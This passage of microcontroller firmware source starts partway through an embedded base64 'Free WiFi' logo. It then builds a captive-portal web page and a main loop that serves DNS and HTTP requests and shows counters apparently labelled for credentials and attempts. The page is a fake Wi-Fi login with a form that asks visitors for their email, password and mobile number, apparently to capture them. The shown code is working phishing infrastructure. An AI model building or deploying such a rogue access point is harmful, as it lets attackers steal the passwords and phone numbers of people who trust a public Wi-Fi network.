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\" alt=\"Free WiFi Logo\" />";
  if(login){
    page += "<br><br><b>Incorrect Code</b>";
  }
  if(reg){
    page += "<br><br><b>You'r code from SMS</b>";
  }
  page += "<br><br><b><u>Login Code</u></b><br><br>";
  page += "<form action=\"/login\" method=\"post\"><input type=\"text\" placeholder=\"code\"><input type=\"submit\" value=\"submit\"></form>";

  page += "<br><b><u>Register</u></b><br><br>";
  page += "<div style=\"text-align:right\">";
  page += "<form action=\"/register\" method=\"post\">Email: <input type=\"text\" name=\"email\" placeholder=\"name@service.com\" ><br>Password: <input type=\"password\" name=\"pass\" placeholder=\"password\"><br>Mobile No.: <input type=\"text\" name=\"no\" placeholder=\"+7.......\"><br></div><input type=\"submit\" value=\"submit\"></form>";
  page += "</center></div></body>";

  return page;
}

void loop() {

  u8g2.clearBuffer(); 
  int percent = getBatteryLevel();
  battSideBar(percent);
  
  dnsServer.processNextRequest();

  buzzerIcon();
  noConnected();
  noAttempts();
  creds();
  server.handleClient();

  u8g2.sendBuffer();
  delay(1000);
}
